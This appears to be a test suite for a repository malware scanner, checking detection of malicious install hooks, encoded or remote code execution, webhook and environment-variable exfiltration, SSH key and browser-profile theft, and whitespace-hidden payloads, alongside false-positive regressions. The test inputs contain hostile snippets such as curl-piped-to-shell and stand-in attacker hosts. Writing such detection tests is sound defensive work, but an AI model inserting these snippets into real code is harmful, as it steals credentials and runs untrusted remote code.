import { test } from "node:test";
import assert from "node:assert/strict";
import { scanRepo, LEVEL } from "../extension/src/lib/repo-scan.js";

const scan = (path, content) => scanRepo([{ path, content }]);
const rules = (r) => r.findings.map((f) => f.rule);

test("clean project yields no findings", () => {
	const r = scanRepo([
		{ path: "package.json", content: JSON.stringify({ scripts: { test: "node --test", build: "tsc" }, dependencies: { express: "^4.19.0" } }) },
		{ path: "src/app.js", content: "import express from 'express';\nconst app = express();\napp.listen(3000);\n" },
	]);
	assert.equal(r.level, LEVEL.NONE);
	assert.deepEqual(r.findings, []);
});

test("postinstall that downloads is high; plain prepare is medium", () => {
	const bad = scan("package.json", JSON.stringify({ scripts: { postinstall: "curl -s https://x.example/a.sh | sh" } }, null, 1));
	assert.equal(bad.level, LEVEL.DANGER);
	assert.equal(bad.findings[0].rule, "install_hook");
	const ok = scan("package.json", JSON.stringify({ scripts: { prepare: "husky install" } }));
	assert.equal(ok.level, LEVEL.WARN);
});

test("git/url dependencies are flagged", () => {
	const r = scan("package.json", JSON.stringify({ dependencies: { "left-pad": "github:someone/left-pad" } }));
	assert.deepEqual(rules(r), ["remote_dependency"]);
});

test("eval of base64 is high", () => {
	const r = scan("server/config.js", "eval(Buffer.from('ZGVidWc=', 'base64').toString());");
	assert.equal(r.level, LEVEL.DANGER);
	assert.ok(rules(r).includes("decode_exec"));
});

test("python exec of remote code is high", () => {
	const r = scan("util.py", "exec(requests.get('https://evil.example/p').text)");
	assert.ok(rules(r).includes("remote_code_load"));
});

test("discord webhook exfil is high", () => {
	const r = scan("a.js", "fetch('https://discord.com/api/webhooks/123/abc', { method: 'POST', body })");
	assert.ok(rules(r).includes("exfil_webhook"));
	assert.equal(r.level, LEVEL.DANGER);
});

test("sensitive path alone is medium, with network in same file is high", () => {
	const alone = scan("a.js", "const p = path.join(os.homedir(), '.ssh', 'id_rsa');");
	assert.equal(alone.level, LEVEL.WARN);
	const stealer = scan("b.js", "const k = fs.readFileSync(home + '/.ssh/id_rsa');\nfetch('https://x.example', { method: 'POST', body: k });");
	assert.equal(stealer.level, LEVEL.DANGER);
});

test("vscode folderOpen auto-run task is high", () => {
	const r = scan(".vscode/tasks.json", '{"tasks":[{"label":"x","command":"node s.js","runOptions":{"runOn":"folderOpen"}}]}');
	assert.ok(rules(r).includes("vscode_autorun"));
	assert.equal(r.level, LEVEL.DANGER);
});

test("obfuscator signature is high", () => {
	const r = scan("x.js", "var _0x1a2b=['a'];function _0x3c4d(_0x5e6f){return _0x1a2b[_0x5e6f];}");
	assert.ok(rules(r).includes("obfuscator_signature"));
});

test("huge base64 blob on one line is flagged without regex-scanning it all", () => {
	const r = scan("blob.js", `var d='${"A".repeat(5000)}';`);
	assert.deepEqual(rules(r), ["long_blob"]);
});

test("skips node_modules, lockfiles, binaries", () => {
	const r = scanRepo([
		{ path: "node_modules/x/index.js", content: "eval(atob('x'))" },
		{ path: "package-lock.json", content: '{"resolved":"https://1.2.3.4/x"}' },
		{ path: "logo.png", content: "eval(atob('x'))" },
	]);
	assert.equal(r.level, LEVEL.NONE);
	assert.equal(r.skipped, 3);
});

test("shell command pipeline in a spawn call is flagged; a bare execSync('ls') is not", () => {
	assert.ok(rules(scan("a.js", "execSync('curl -s https://x.example | bash')")).length > 0);
	assert.deepEqual(rules(scan("b.js", "execSync('ls -la')")), []);
});

// Regression: a real Next.js + Puppeteer + Supabase project produced all of these as false alarms.
test("web-app cookie APIs are not browser cookie theft", () => {
	const lines = [
		'const cookie = res.cookies.get("admin_session");',
		'res.cookies.set("admin_session", "", { path: "/", httpOnly: true, secure: process.env.NODE_ENV === "production", sameSite: "lax", maxAge: 0 });',
		'serverClient.mockRejectedValue(new Error("cookies() outside a request"));',
	];
	for (const l of lines) assert.deepEqual(rules(scan("src/app/api/auth/route.ts", l)), [], l);
});

test("bare eval, Puppeteer $$eval and regex exec are not reported", () => {
	for (const l of ["const t = await page.$$eval('*', els => els.length);", "const v = eval(code);", "const m = re.exec(text);", "const f = new Function('a', 'return a');"]) {
		assert.deepEqual(rules(scan("x.mjs", l)), [], l);
	}
});

test("eval of decoded or remote input is still high", () => {
	assert.ok(rules(scan("a.js", "eval(atob(payload))")).includes("decode_exec"));
	assert.ok(rules(scan("a.js", "new Function(atob(payload))()")).includes("decode_exec"));
	assert.ok(rules(scan("a.js", "eval(await (await fetch(u)).text())")).includes("remote_code_load"));
});

test("SheetJS CDN dependency is trusted; unknown URL and github shorthand are not", () => {
	const dep = (spec) => scan("package.json", JSON.stringify({ dependencies: { xlsx: spec } }));
	assert.deepEqual(rules(dep("https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz")), []);
	assert.deepEqual(rules(dep("https://evil.example/x.tgz")), ["remote_dependency"]);
	assert.deepEqual(rules(dep("github:someone/xlsx")), ["remote_dependency"]);
	assert.deepEqual(rules(dep("file:../local-pkg")), []);
});

test("link-local and private IPs (SSRF tests, local dev) are not exfil; public raw IPs are", () => {
	assert.deepEqual(rules(scan("t.test.ts", 'await fetchImageAsReference("http://169.254.169.254/latest/meta-data")')), []);
	assert.deepEqual(rules(scan("a.js", 'fetch("http://192.168.1.10:3000/api")')), []);
	assert.deepEqual(rules(scan("a.js", 'fetch("http://127.0.0.1:8080/")')), []);
	assert.deepEqual(rules(scan("a.js", 'fetch("http://45.61.12.9:8080/upload")')), ["exfil_endpoint"]);
});

test("browser profile theft is still caught; bare mnemonic needs a file read plus network", () => {
	const steal = scan("s.js", "const db = path.join(home, 'AppData/Local/Google/Chrome/User Data/Default/Login Data');\nfetch('https://x.example', { method: 'POST', body: db });");
	assert.equal(steal.level, LEVEL.DANGER);
	assert.deepEqual(rules(scan("w.js", "const mnemonic = generateMnemonic();")), []);
	assert.equal(scan("w.js", "const m = fs.readFileSync('mnemonic.txt');\nfetch('https://x.example', { method: 'POST', body: m });").level, LEVEL.DANGER);
});

// ── New gap coverage (from malware-museum + contagious-interview research, 2026-11-13) ─────────

// Sample 1 (Supply Chain / metrica-node): `new Function.constructor("require", payload)(require)`
// is an alias for `new Function` that bypasses the simpler `Function(` check.
test("Function.constructor used to execute downloaded payload is high (Sample 1 pattern)", () => {
	// Pattern: decode a URL, fetch payload, execute via Function.constructor — common in metrica-node style attacks
	const r = scan("lib/caller.js", "const handler = new Function.constructor('require', await axios.get(src).data);\nhandler(require);");
	assert.ok(rules(r).includes("remote_code_load"), "Function.constructor with remote fetch should trigger remote_code_load");
	assert.equal(r.level, LEVEL.DANGER);
});

test("Function.constructor with base64 decoded payload is high", () => {
	const r = scan("lib/loader.js", "new Function.constructor('return', Buffer.from(encoded, 'base64').toString())();");
	assert.ok(rules(r).includes("decode_exec"), "Function.constructor with base64 should trigger decode_exec");
});

test("obj.Function.constructor and page.Function.constructor are not flagged (false-positive guard)", () => {
	assert.deepEqual(rules(scan("x.js", "const f = page.Function.constructor('x', 'return x');")), []);
	assert.deepEqual(rules(scan("x.js", "obj.Function.constructor('a', 'b');")), []);
});

// Sample 3 & 4 (Crypto/DAO stealers): Node.js built-ins listed as npm `dependencies`.
// `child_process`, `fs`, `crypto`, `path` are built-ins — no npm install needed.
// When an attacker wraps their payload in a fake package they still declare these to satisfy `require`.
test("Node.js built-ins as npm dependencies are flagged (Samples 3 & 4 pattern)", () => {
	const r = scan("package.json", JSON.stringify({
		dependencies: { express: "^4.18.0", child_process: "^1.0.2", fs: "^0.0.1-security" },
	}));
	const ruleIds = rules(r);
	assert.ok(ruleIds.includes("builtin_as_dep"), "child_process as dependency should be flagged");
	assert.equal(ruleIds.filter((id) => id === "builtin_as_dep").length, 2, "both child_process and fs should be flagged");
});

test("Node.js built-ins in devDependencies are not flagged (some tools do this)", () => {
	const r = scan("package.json", JSON.stringify({
		devDependencies: { child_process: "^1.0.2", crypto: "^1.0.1" },
	}));
	assert.ok(!rules(r).includes("builtin_as_dep"), "devDependencies built-ins should not be flagged");
});

test("normal dependencies are not flagged as built-ins", () => {
	const r = scan("package.json", JSON.stringify({
		dependencies: { express: "^4.18.0", react: "^18.2.0", "next": "^14.0.0" },
	}));
	assert.deepEqual(rules(r), []);
});

// Samples 3, 4 & Lazarus Stage 1: whitespace-padding technique (1400+ spaces push payload off-screen).
test("whitespace-hidden payload (500+ leading spaces before code) is flagged as high", () => {
	const hiddenLine = " ".repeat(600) + "(function(_0x1a2b){return _0x1a2b})('x');";
	const r = scan("routes/api/transactions.js", "const router = require('express').Router();\nmodule.exports = router;\n" + hiddenLine);
	assert.ok(rules(r).includes("whitespace_hidden"), "whitespace-padded hidden code should be caught");
	assert.equal(r.level, LEVEL.DANGER);
});

test("normal indentation (up to 20 spaces) is not whitespace_hidden", () => {
	const normalCode = "    ".repeat(4) + "const x = require('express');"; // 16 spaces
	assert.deepEqual(rules(scan("server.js", normalCode)), []);
});

// BeaverTail / Lazarus Stage-1: explicitly serializing process.env into a network request body.
// Sends JWT_SECRET, MONGO_URI, AWS keys, etc. in one HTTP call.
test("serializing process.env into a network request body is high (BeaverTail pattern)", () => {
	const r = scan("routes/api/auth.js",
		"const params = new URLSearchParams({ processInfo: JSON.stringify(process.env), tid: 'x' });\n" +
		"const res = await fetch(c2url + '?' + params);");
	assert.ok(rules(r).includes("process_env_exfil"), "JSON.stringify(process.env) + fetch should be caught");
	assert.equal(r.level, LEVEL.DANGER);
});

test("per-key process.env access with fetch is NOT flagged (normal Express/Next.js app)", () => {
	// A real app that reads per-key env vars and also makes HTTP calls must not be flagged.
	const r = scan("lib/api.js",
		"const dbUrl = process.env.DATABASE_URL;\n" +
		"const apiKey = process.env.API_KEY;\n" +
		"const res = await fetch('https://api.example.com/data', { headers: { Authorization: `Bearer ${apiKey}` } });");
	assert.ok(!rules(r).includes("process_env_exfil"), "per-key env access with fetch must not trigger process_env_exfil");
});

// Sample 5 (Typosquat via vite.config.js): a build config file that makes network requests is suspicious.
// A Vite plugin with a network sink runs at build time with full filesystem access.
test("network call inside a vite config file is flagged (Sample 5 / graphalgo pattern)", () => {
	const r = scan("vite.config.js",
		"import { defineConfig } from 'vite';\n" +
		"import react from '@vitejs/plugin-react';\n" +
		"import logger from 'eslints-logger';\n" +
		"logger.init({ endpoint: 'https://collector.example.com' });\n" +
		"fetch('https://collector.example.com/beacon');\n" +
		"export default defineConfig({ plugins: [react()] });");
	assert.ok(rules(r).includes("config_file_net"), "fetch inside vite.config.js should trigger config_file_net");
});

test("vite config without network calls is clean (normal project regression)", () => {
	const r = scan("vite.config.ts",
		"import { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\n" +
		"export default defineConfig({ plugins: [react()], server: { port: 3000 } });");
	assert.deepEqual(rules(r), [], "clean vite config should not be flagged");
});

test("tailwind config without network calls is clean (normal project regression)", () => {
	const r = scan("tailwind.config.js",
		"/** @type {import('tailwindcss').Config} */\nexport default {\n  content: ['./src/**/*.{js,ts,jsx,tsx}'],\n  theme: { extend: {} },\n  plugins: [],\n};");
	assert.deepEqual(rules(r), [], "clean tailwind config should not be flagged");
});

// Regression: a typical Next.js / Express server uses process.env for config but must NOT be flagged.
test("normal Next.js API route reading env vars and calling an external API is not flagged", () => {
	const r = scan("src/app/api/data/route.ts",
		"const apiBase = process.env.NEXT_PUBLIC_API_URL;\n" +
		"const secret = process.env.API_SECRET;\n" +
		"export async function GET() {\n" +
		"  const res = await fetch(`${apiBase}/items`, { headers: { 'x-api-key': secret } });\n" +
		"  return Response.json(await res.json());\n" +
		"}");
	assert.ok(!rules(r).includes("process_env_exfil"), "Next.js API route must not trigger process_env_exfil");
	assert.equal(r.level, LEVEL.NONE);
});

// Regression: a normal Supabase + Express server must stay clean.
test("normal Supabase/Express server is not flagged", () => {
	const r = scanRepo([
		{
			path: "package.json",
			content: JSON.stringify({
				scripts: { start: "node server.js", dev: "nodemon server.js" },
				dependencies: { express: "^4.18.0", "@supabase/supabase-js": "^2.39.0" },
			}),
		},
		{
			path: "server.js",
			content:
				"import express from 'express';\n" +
				"import { createClient } from '@supabase/supabase-js';\n" +
				"const supabase = createClient(process.env.SUPABASE_URL, process.env.SUPABASE_ANON_KEY);\n" +
				"const app = express();\n" +
				"app.get('/items', async (req, res) => {\n" +
				"  const { data } = await supabase.from('items').select('*');\n" +
				"  res.json(data);\n" +
				"});\n" +
				"app.listen(3000);\n",
		},
	]);
	assert.equal(r.level, LEVEL.NONE);
	assert.deepEqual(r.findings, []);
});
